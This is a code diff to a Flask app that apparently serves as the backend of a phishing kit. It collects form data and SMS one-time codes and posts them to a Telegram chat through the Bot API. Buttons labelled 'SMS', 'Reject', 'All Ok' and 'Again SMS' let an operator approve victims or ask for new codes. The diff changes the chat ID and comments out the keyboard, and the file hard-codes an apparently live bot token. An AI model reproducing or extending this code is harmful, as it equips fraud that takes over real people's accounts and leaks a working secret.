@@ -1,19 +1,20 @@
+import uuid
+
 import requests
 from flask import Flask, request, render_template, redirect, session, jsonify
 from flask_cors import CORS
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup
-import uuid
-
+# from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 
 app = Flask(__name__)
 CORS(app)
 
 app.secret_key = 'your_very_secret_key'
 TELEGRAM_TOKEN = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U'
-TELEGRAM_CHAT_ID = '-4151741751'
+TELEGRAM_CHAT_ID = '-4104959417'
 
 need_redirect = None
 form_tokens = {}
+
 
 @app.route('/set_data', methods=['GET', 'POST'])
 def set_data():
@@ -99,32 +100,34 @@ def smscode():
     else:
         return "Error sending message"
 
+
 def send_msg_enter_sms(tekst, chat_id, form_uid):
-    keyboard = [
-        [InlineKeyboardButton("SMS", callback_data=f'sms-{form_uid}'),
-         InlineKeyboardButton("Reject", callback_data=f'reject-{form_uid}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    # keyboard = [
+    #     [InlineKeyboardButton("SMS", callback_data=f'sms-{form_uid}'),
+    #      InlineKeyboardButton("Reject", callback_data=f'reject-{form_uid}')]
+    # ]
+    # reply_markup = InlineKeyboardMarkup(keyboard)
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     data = {
         'chat_id': chat_id,
         'text': tekst,
-        'reply_markup': reply_markup.to_json()
+        # 'reply_markup': reply_markup.to_json()
     }
     response = requests.post(url, data=data)
     return response.ok
 
+
 def send_msg_smscode(tekst, chat_id, form_uid):
-    keyboard = [
-        [InlineKeyboardButton("All Ok", callback_data=f'ok-{form_uid}'),
-         InlineKeyboardButton("Again SMS", callback_data=f'reject-{form_uid}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    # keyboard = [
+    #     [InlineKeyboardButton("All Ok", callback_data=f'ok-{form_uid}'),
+    #      InlineKeyboardButton("Again SMS", callback_data=f'reject-{form_uid}')]
+    # ]
+    # reply_markup = InlineKeyboardMarkup(keyboard)
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     data = {
         'chat_id': chat_id,
         'text': tekst,
-        'reply_markup': reply_markup.to_json()
+        # 'reply_markup': reply_markup.to_json()
     }
     response = requests.post(url, data=data)
     return response.ok
@@ -149,11 +152,11 @@ def check_1():
 @app.route('/api/telegram-callback', methods=['POST'])
 def telegram_callback():
     data = request.json
-    print('data =',data)
+    print('data =', data)
     callback_data = data['form_uid']
     callback_uid = callback_data.split('-')[-1]
-    print('callback_data =',callback_data)
-    print('callback_uid =',callback_uid)
+    print('callback_data =', callback_data)
+    print('callback_uid =', callback_uid)
     session_uid = session.get('form_uid')
     print(f"Received UID: {callback_uid}, Session UID: {session.get('form_uid')}")  # Debug log
     global need_redirect
@@ -167,9 +170,6 @@ def telegram_callback():
     else:
         print("UID mismatch or invalid callback data")
         return jsonify(success=False, error="Invalid or mismatched UID")
-
-
-
 
 
 @app.route('/confirmation')
